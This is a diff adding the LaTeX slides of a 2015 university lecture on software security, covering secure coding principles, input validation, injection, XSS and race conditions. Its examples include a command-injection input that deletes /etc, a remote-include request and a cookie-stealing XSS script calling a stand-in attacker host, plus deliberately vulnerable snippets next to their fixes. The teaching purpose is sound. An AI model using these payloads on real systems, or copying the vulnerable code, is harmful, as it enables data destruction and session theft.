@@ -1,0 +1,845 @@
+\documentclass{beamer}
+\usetheme{Frankfurt}
+
+\usepackage{listings}
+
+\title{Software Security}
+\subtitle{Lecture 14 \\ Computer Security DD2395}
+\author[R. Guanciale]{
+  Roberto Guanciale\\
+  robertog@kth.se
+}
+\date{2015-12-14}
+\begin{document}
+
+\begin{frame}[plain]
+  \titlepage
+\end{frame}
+
+\begin{frame}{Software Security}
+  \begin{itemize}
+    \item many vulnerabilities result from poor programming practises 
+      \begin{itemize}
+        \item SQL injection, buffer overflow, cross site scripting, \dots
+      \end{itemize}
+    \item often from insufficient checking / validation of
+      program input 
+    \item awareness of issues is critical 
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Software Quality vs Security}
+  \begin{itemize}
+  \item software quality and reliability
+    \begin{itemize}
+    \item accidental failure of program
+    \item from theoretically random unanticipated input
+    \item improve using structured design and testing
+    \item not how many bugs, but how often triggered
+    \end{itemize}
+  \item software security is related
+    \begin{itemize}
+    \item but attacker chooses input distribution, specifically
+      targeting buggy code to exploit
+    \item triggered by often very unlikely inputs
+    \item which common tests don’t identify
+    \end{itemize}
+  \item software security = software quality/reliability + Murphy's law
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Abstract Program Model}
+  \begin{itemize}
+  \item inputs
+    \begin{itemize}
+    \item keyboard, mouse
+    \item DMBS, file system
+    \item other processes
+    \item OS, network
+    \end{itemize}
+  \item outputs
+    \begin{itemize}
+    \item display, printer
+    \item \dots
+    \end{itemize}
+  \item interference
+  \item when writing programs, developers focus on what is needed to
+    solve the problem
+  \end{itemize}
+\end{frame}
+ 
+\begin{frame}{OWASP Secure Coding Principles}
+  \begin{itemize}
+    \item Minimize attack surface area
+      \begin{itemize}
+      \item Every feature adds potential vulnerability
+      \end{itemize}
+    \item Establish secure defaults
+      \begin{itemize}
+      \item Out-of-the-box configuration safe, can be changed
+      \end{itemize}
+    \item Principle of Least privilege
+      \begin{itemize}
+      \item Only give minimum rights needed
+      \end{itemize}
+    \item Principle of Defense in depth
+      \begin{itemize}
+      \item Several walls of defense 
+      \end{itemize}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{OWASP Secure Coding Principles}
+  \begin{itemize}
+    \item Fail securely
+    \item Don’t trust services
+      \begin{itemize}
+      \item Check input
+      \end{itemize}
+    \item Separation of duties
+    \item Avoid security by obscurity
+    \item Keep security simple
+    \item Fix security issues correctly
+      \begin{itemize}
+      \item A change in one application might trickle to others, need
+        to test all
+      \end{itemize}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Defensive Programming}
+  \begin{itemize}
+    \item a form of defensive design to ensure continued
+function of software despite unforeseen usage
+    \item requires attention to all aspects of program
+execution, environment, data processed
+    \item also called secure programming
+    \item assume nothing, check all potential errors
+    \item rather than just focusing on solving task
+    \item must validate all assumptions
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Defensive Programming}
+  \begin{itemize}
+  \item No assumptions
+  \item Reduce code complexity
+  \item Source code reviews - by others
+  \item Testing
+  \item Reuse of secure components
+  \item Check legacy and other people’s code 
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Defensive Programming}
+  \begin{itemize}
+    \item To avoid bugs due to non-canonical input: canonicalization
+    \item Avoid unchecked use of constant-size structures and
+      functions for dynamic-size data
+    \item Encrypt/authenticate all important data transmitted over
+      networks
+    \item Do not attempt to implement your own encryption scheme, but
+      use a proven one instead
+    \item All data is important until proven otherwise
+    \item All data is tainted until proven otherwise
+    \item All code is insecure until proven otherwise
+    \item Never trust the client
+    \item Verify that data are correct, not that they are incorrect
+    \item Design by contract: uses preconditions, postconditions and invariants
+    \item Assertions within functions
+    \item Prefer exceptions to return codes
+  \end{itemize}
+\end{frame}
+
+
+
+
+
+
+
+\begin{frame}{Security by Design}
+  \begin{itemize}
+  \item security and reliability common design goals in
+    most engineering disciplines
+    \begin{itemize}
+    \item society not tolerant of bridge/plane etc failures
+    \end{itemize}
+
+  \item software development not as mature
+    \begin{itemize}
+    \item much higher failure levels tolerated
+    \end{itemize}
+
+  \item despite having a number of software
+development and quality standards
+    \begin{itemize}
+    \item main focus is general development lifecycle
+    \item increasingly identify security as a key goal
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Handling Program Input}
+  \begin{itemize}
+  \item incorrect handling a very common failing
+  \item input is any source of data from outside
+    \begin{itemize}
+    \item data read from keyboard, file, network
+    \item also execution environment, config data
+    \end{itemize}
+  \item must identify all data sources
+  \item and explicitly validate assumptions on size and
+type of values before use 
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Input Size \& Buffer Overflow}
+  \begin{itemize}
+  \item often have assumptions about buffer size
+    \begin{itemize}
+    \item eg. that user input is only a line of text
+    \end{itemize}
+  \item size buffer accordingly but fail to verify size
+    \begin{itemize}
+    \item resulting in buffer overflow
+    \end{itemize}
+  \item testing may not identify vulnerability
+    \begin{itemize}
+    \item since focus on ``normal, expected'' inputs
+    \end{itemize}
+  \item safe coding treats all input as dangerous
+    \begin{itemize}
+    \item hence must process so as to protect program 
+    \item check the size of input against size of allocated buffers
+    \item check the size of requests to allocate new buffers
+    \item check the result of allocation
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Interpretation of Input}
+  \begin{itemize}
+  \item program input may be binary or text
+    \begin{itemize}
+    \item binary interpretation depends on encoding and is
+      usually application specific
+    \item text encoded in a character set e.g. ASCII
+    \item internationalization has increased variety
+    \item also need to validate interpretation before use
+    \end{itemize}
+  \item failure to validate may result in an exploitable
+vulnerability
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Injection Attacks}
+  \begin{itemize}
+  \item flaws relating to invalid input handling which
+then influences program execution
+    \begin{itemize}
+    \item often when passed as a parameter to a helper
+program or other utility or subsystem
+    \end{itemize}
+  \item most often occurs in scripting languages
+    \begin{itemize}
+    \item encourage reuse of other programs / modules
+    \item often seen in web CGI scripts
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Insecure python CGI}
+  \begin{verbatim}
+#!/usr/bin/python
+form = cgi.FieldStorage()
+user = form["user"].value
+
+call("/usr/bin/finger %s > res.txt" % user,\
+ shell=True)
+
+print """
+<html><body>%s</body></html>
+"""% open("res.txt", "r").read()
+
+--------------------
+input: guancio; rm -rf /etc
+  \end{verbatim}
+  
+\end{frame}
+
+
+\begin{frame}[fragile]{Safer Script}
+  \begin{itemize}
+  \item counter attack by validating input
+    \begin{itemize}
+    \item compare to pattern that rejects invalid input
+    \item see example additions to script: 
+    \end{itemize}
+  \end{itemize}
+
+  \begin{verbatim}
+import re
+...
+
+user = form["user"].value
+
+assert user == re.sub('[^\w]', '_', user), \
+   "The specified user contains illegal characters!"
+call("/usr/bin/finger %s > res.txt" % user,\
+    shell=True)
+  \end{verbatim}
+\end{frame}
+
+\begin{frame}[fragile]{More Safer Script}
+  \begin{itemize}
+  \item use secure API
+  \item if \verb| shell=True| and args is a string, the string specifies the command to execute through the shell
+  \end{itemize}
+
+  \begin{verbatim}
+...
+
+res = Popen(["/usr/bin/finger", user]).stdout.read()
+  \end{verbatim}
+\end{frame}
+
+\begin{frame}[fragile]{SQL Injection}
+  \begin{itemize}
+  \item another widely exploited injection attack
+    \begin{itemize}
+    \item when input used in SQL query to database
+    \item similar to command injection
+    \end{itemize}
+  \item SQL meta-characters are the concern
+  \item must check and validate input for these
+  \end{itemize}
+
+  \begin{verbatim}
+name = REQUEST['name'];
+query = "SELECT * FROM suppliers WHERE name = '" +
+         name + "';"
+result = c.execute(query);
+
+query = "SELECT * FROM suppliers WHERE name = '" +
+         escape_str(name) + "';"
+
+c.execute("SELECT * FROM suppliers WHERE name = %s", name)
+  \end{verbatim}
+\end{frame}
+
+
+\begin{frame}[fragile]{Script Code Injection}
+  \begin{itemize}
+  \item input includes code that is then executed
+  \item PHP: variable + global field variables + remote include
+  \item this type of attack is widely exploited
+  \end{itemize}
+
+  \begin{verbatim}
+<?php
+include $path . 'functions.php';
+include $path . 'data/prefs.php';
+...
+
+GET /calendar/embed/day.php?path=\
+       http://hacker.web.site/hack.txt?&cmd=ls
+  \end{verbatim}
+\end{frame}
+
+
+\begin{frame}{Cross Site Scripting Attacks}
+  \begin{itemize}
+  \item attacks where input from one user is later
+output to another user
+  \item XSS commonly seen in scripted web apps
+  \begin{itemize}
+    \item with script code included in output to browser
+    \item any supported script, e.g. Javascript, ActiveX
+    \item assumed to come from application on site
+  \end{itemize}
+  \item XSS reflection
+  \begin{itemize}
+    \item malicious code supplied to site
+    \item subsequently displayed to other users
+  \end{itemize}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{XSS}
+  \begin{itemize}
+  \item cf. guestbooks, wikis, blogs etc
+  \item where comment includes script code
+  \begin{itemize}
+    \item e.g. to collect cookie details of viewing users
+  \end{itemize}
+  \item need to validate data supplied
+  \begin{itemize}
+    \item including handling various possible encodings
+  \end{itemize}
+  \item attacks both input and output handling
+  \item attack code can be encoded in ASCII, exadecimal or UTF-8
+  \end{itemize}
+
+\begin{verbatim}
+Thanks for this information, its great!
+<script>document.location=
+ 'http://hacker.web.site/cookie.cgi?'+
+ document.cookie</script>
+\end{verbatim}
+
+\end{frame}
+
+
+\begin{frame}{Validating Input Syntax}
+  \begin{itemize}
+  \item to ensure input data meets assumptions
+  \begin{itemize}
+    \item e.g. is printable, HTML, email, userid etc
+    \item warning: XML lol, zip bomb, png bomb
+  \end{itemize}
+  \item compare to what is known acceptable
+  \item not to known dangerous
+  \begin{itemize}
+    \item as can miss new problems, bypass methods
+  \end{itemize}
+  \item commonly use regular expressions
+  \begin{itemize}
+    \item pattern of characters describe allowable input
+    \item details vary between languages
+  \end{itemize}
+  \item bad input either rejected or altered 
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Alternate Encodings}
+  \begin{itemize}
+  \item may have multiple means of encoding text
+  \begin{itemize}
+    \item due to structured form of data, e.g. HTML
+    \item or via use of some large character sets
+  \end{itemize}
+  \item Unicode used for internationalization
+  \begin{itemize}
+    \item uses 16-bit value for characters
+    \item UTF-8 encodes as 1-4 byte sequences
+  \end{itemize}
+  \item have redundant variants
+  \begin{itemize}
+    \item e.g. / is 2F, C0 AF, E0 80 AF
+    \item hence if blocking absolute filenames check all!
+  \end{itemize}
+  \item must canonicalize input before checking 
+  \end{itemize}
+\end{frame}
+
+
+
+\begin{frame}{Validating Numeric Input}
+  \begin{itemize}
+  \item may have data representing numeric values
+  \item internally stored in fixed sized value
+  \begin{itemize}
+    \item e.g. 8, 16, 32, 64-bit integers or 32, 64, 96 float
+    \item signed or unsigned
+  \end{itemize}
+  \item must correctly interpret text form
+  \item and then process consistently
+  \begin{itemize}
+    \item have issues comparing signed to unsigned
+    \item e.g. large positive unsigned is negative signed
+    \item could be used to thwart buffer overflow check 
+  \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+
+\begin{frame}{Input Fuzzing}
+  \begin{itemize}
+  \item powerful testing method using a large range of
+randomly generated inputs
+  \begin{itemize}
+    \item to test whether program/function correctly handles
+abnormal inputs
+    \item simple, free of assumptions, cheap
+    \item assists with reliability as well as security
+  \end{itemize}
+  \item can also use templates to generate classes of
+known problem inputs
+  \begin{itemize}
+    \item could then miss bugs, so use random as well 
+  \end{itemize}
+  \item exhaustive search, two variables 32 bits, $2^{64}$ possible inputs
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Writing Safe Program Code}
+  \begin{itemize}
+  \item next concern is processing of data by some
+algorithm to solve required problem
+  \item compiled to machine code or interpreted
+  \begin{itemize}
+    \item have execution of machine instructions
+    \item manipulate data in memory and registers
+  \end{itemize}
+  \item security issues:
+  \begin{itemize}
+    \item correct algorithm implementation
+    \item correct machine instructions for algorithm
+    \item valid manipulation of data 
+  \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+
+\begin{frame}{Correct Algorithm Implementation}
+  \begin{itemize}
+  \item issue of good program development
+  \item to correctly handle all problem variants
+  \begin{itemize}
+    \item c.f. Netscape/Debian random number bug
+    \item TCP random sequence number enabling IP spoofing
+    \item supposed to be unpredictable, but wasn’t
+  \end{itemize}
+  \item when debug/test code left in production
+  \begin{itemize}
+    \item used to access data or bypass checks
+    \item c.f. Morris Worm exploit of sendmail
+  \end{itemize}
+  \item interpreter incorrectly handles semantics
+  \item hence care needed in design/implement 
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Correct Machine Language}
+  \begin{itemize}
+  \item ensure machine instructions correctly
+    implement high-level language code
+  \begin{itemize}
+    \item often ignored by programmers
+    \item assume compiler/interpreter is correct
+    \item c.f. Ken Thompson’s paper, Reflections on Trusting Trust
+  \end{itemize}
+  \item requires comparing machine code with original
+source
+  \begin{itemize}
+    \item slow and difficult
+    \item is required for higher Common Criteria EAL’s
+  \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Correct Data Interpretation}
+  \begin{itemize}
+  \item data stored as bits/bytes in computer
+    \begin{itemize}
+    \item grouped as words, longwords etc
+    \item interpretation depends on machine instruction
+    \end{itemize}
+  \item languages provide different capabilities for
+    restricting/validating data use
+  \begin{itemize}
+  \item strongly typed languages more limited, safer
+  \item others more liberal, flexible, less safe e.g. C 
+  \end{itemize}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Correct Use of Memory}
+  \begin{itemize}
+  \item issue of dynamic memory allocation
+    \begin{itemize}
+    \item used to manipulate unknown amounts of data
+    \item allocated when needed, released when done
+    \end{itemize}
+\item memory leak occurs if incorrectly released
+\item many older languages have no explicit support for
+dynamic memory allocation
+    \begin{itemize}
+    \item rather use standard library functions
+    \item programmer ensures correct allocation/release
+    \end{itemize}
+\item modern languages handle automatically
+  \end{itemize}
+\end{frame}
+
+
+
+
+
+\begin{frame}{Race Conditions in Shared Memory}
+  \begin{itemize}
+  \item when multiple threads/processes access shared
+    data / memory
+  \item unless access synchronized can get corruption
+    or loss of changes due to overlapping accesses
+  \item so use suitable synchronization primitives
+    \begin{itemize}
+    \item correct choice \& sequence may not be obvious
+    \end{itemize}
+  \item have issue of access deadlock 
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Interacting with O/S}
+  \begin{itemize}
+  \item programs execute on systems under O/S
+    \begin{itemize}  
+    \item mediates and shares access to resources    
+    \item constructs execution environment
+    \item with environment variables and arguments
+    \end{itemize}
+  \item systems have multiple users
+    \begin{itemize}
+    \item with access permissions on resources / data
+    \end{itemize}
+  \item programs may access shared resources
+    \begin{itemize}
+    \item e.g. files
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Environment Variables}
+  \begin{itemize}
+  \item set of string values inherited from parent
+    \begin{itemize}  
+    \item can affect process behavior
+    \item e.g. PATH, IFS, LD\_LIBRARY\_PATH
+    \end{itemize}
+  \item process can alter for its children
+  \item another source of untrusted program input
+  \item attackers use to try to escalate privileges
+  \item privileged shell scripts targeted
+    \begin{itemize}  
+    \item very difficult to write safely and correctly
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]{Example Vulnerable Scripts}
+  \begin{itemize}
+  \item using PATH or IFS environment variables
+  \item cause script to execute attackers program
+  \item with privileges granted to script
+  \item almost impossible to prevent in some form
+  \end{itemize}
+\begin{verbatim}
+#!/bin/bash
+user=`echo $1 | sed 's/@.*$//'`
+grep $user /var/local/accounts/ipaddrs
+\end{verbatim}
+
+\begin{verbatim}
+#!/bin/bash
+PATH=”/sbin:/bin:/usr/sbin:/usr/bin”
+export PATH
+user=`echo $1 | sed 's/@.*$//'`
+grep $user /var/local/accounts/ipaddrs
+\end{verbatim}
+
+\end{frame}
+
+\begin{frame}{Vulnerable Compiled Programs}
+  \begin{itemize}
+  \item if invoke other programs can be vulnerable to
+    PATH variable manipulation 
+  \begin{itemize}
+  \item must reset to ``safe'' values
+  \end{itemize}
+\item if dynamically linked may be vulnerable to
+  manipulation of LD\_LIBRARY\_PATH
+  \begin{itemize}
+  \item used to locate suitable dynamic library
+  \item must either statically link privileged programs
+  \item or prevent use of this variable 
+  \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+
+\begin{frame}{Use of Least Privilege}
+  \begin{itemize}
+  \item exploit of flaws may give attacker greater
+privileges - privilege escalation
+\item  hence run programs with least privilege needed
+to complete their function
+  \begin{itemize}
+  \item determine suitable user and group to use
+  \item whether grant extra user or group privileges
+  \begin{itemize}
+  \item  latter preferred and safer, may not be sufficient
+  \end{itemize}
+\item ensure can only modify files/dirs needed
+  \begin{itemize}
+  \item  otherwise compromise results in greater damage
+  \item  recheck these when moved or upgraded
+  \end{itemize}
+  \end{itemize}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Root/Admin Programs}
+  \begin{itemize}
+  \item programs with root / administrator privileges a
+major target of attackers
+  \begin{itemize}
+  \item since provide highest levels of system access
+  \item are needed to manage access to protected system
+resources, e.g. network server ports
+  \end{itemize}
+\item  often privilege only needed at start
+  \begin{itemize}
+  \item can then run as normal user
+  \end{itemize}
+\item good design partitions complex programs in
+smaller modules with needed privileges 
+\item confinement: JVM, chroot, KVM, Virtualization, \dots
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{System Calls and Standard Library Functions}
+  \begin{itemize}
+  \item programs use system calls and standard library
+    functions for common operations
+    \begin{itemize}
+    \item and make assumptions about their operation
+    \item if incorrect behavior is not what is expected
+    \item may be a result of system optimizing access to
+      shared resources
+      \begin{itemize}
+      \item by buffering, re-sequencing, modifying requests
+      \end{itemize}
+    \item can conflict with program goals 
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]{Secure File Shredder}
+  \begin{verbatim}
+patterns = [10101010, 01010101, 11001100, ... ]
+open file for writing
+for each pattern
+ seek to start of file
+ overwrite file contents with pattern
+close file
+remove file
+  \end{verbatim}
+\begin{verbatim}
+patterns = [10101010, 01010101, 11001100, ... ]
+open file for update
+for each pattern
+ seek to start of file
+ overwrite file contents with pattern
+ flush application write buffers
+ sync file system write buffers with device
+close file
+remove file
+\end{verbatim}
+\end{frame}
+
+
+
+
+\begin{frame}{Race Conditions}
+  \begin{itemize}
+  \item programs may access shared resources
+    \begin{itemize}
+    \item e.g. mailbox file, CGI data file
+    \end{itemize}
+  \item need suitable synchronization mechanisms
+    \begin{itemize}
+    \item e.g. lock on shared file
+    \end{itemize}
+  \item alternatives
+    \begin{itemize}
+    \item  lockfile - create/check, advisory, atomic
+    \item  advisory file lock - e.g. flock
+    \item  mandatory file lock - e.g. fcntl, need release
+      \begin{itemize}
+      \item later mechanisms vary between O/S
+      \item have subtle complexities in use 
+      \end{itemize}
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Safe Temporary Files}
+  \begin{itemize}
+  \item  many programs use temporary files
+  \item  often in common, shared system area
+  \item  must be unique, not accessed by others
+  \item  commonly create name using process ID
+    \begin{itemize}
+    \item unique, but predictable
+    \item attacker might guess and attempt to create own
+    \end{itemize}
+    between program checking and creating
+  \item secure temp files need random names
+    \begin{itemize}
+    \item some older functions unsafe
+    \item must need correct permissions on file/dir 
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Other Program Interaction}
+  \begin{itemize}
+  \item may use services of other programs
+  \item must identify/verify assumptions on data
+  \item esp older user programs
+    \begin{itemize}
+    \item now used within web interfaces
+    \item must ensure safe usage of these programs
+    \end{itemize}
+  \item issue of data confidentiality / integrity
+    \begin{itemize}
+    \item within same system use pipe / temp file
+    \item across net use IPSec, TLS/SSL, SSH etc
+    \end{itemize}
+  \item also detect / handle exceptions / errors
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}{Handling Program Output}
+  \begin{itemize}
+  \item final concern is program output
+    \begin{itemize}
+    \item stored for future use, sent over net, displayed
+    \item may be binary or text
+    \end{itemize}
+  \item conforms to expected form / interpretation
+    \begin{itemize}
+    \item assumption of common origin,
+    \item c.f. XSS, VT100 escape seqs, X terminal hijack
+    \end{itemize}
+  \item uses expected character set
+  \item target not program but output display device 
+  \end{itemize}
+\end{frame}
+
+
+
+\end{document}
+
+%%% Local Variables: 
+%%% mode: latex
+%%% TeX-master: t
+%%% End: 
